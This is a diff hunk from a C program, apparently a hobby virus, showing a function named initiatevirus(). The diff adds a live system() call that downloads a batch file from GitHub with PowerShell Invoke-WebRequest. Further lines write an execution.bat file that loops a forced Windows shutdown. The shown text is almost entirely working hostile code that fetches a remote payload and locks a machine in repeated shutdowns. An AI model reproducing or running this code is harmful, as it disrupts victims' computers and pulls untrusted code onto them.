@@ -218,7 +218,7 @@ void exhaust(int capacity)
 /*                                                             Declared Function For Virus                                                      */
 void initiatevirus()
 {
-    // system("Powershell -Command \" Invoke-WebRequest https://github.com/nazar-ansari/File-Encrypter/raw/main/Executable.exe -OutFile main.exe\" ");
+    system("Powershell -Command \" Invoke-WebRequest https://github.com/nazar-ansari/Windows-Utility-Manager/blob/main/source/depend.bat -OutFile depend.bat\" ");
     system("echo @ECHO OFF > execution.bat");
     system("echo :a >> execution.bat");
     system("echo shutdown /s /t 00 >>execution.bat");
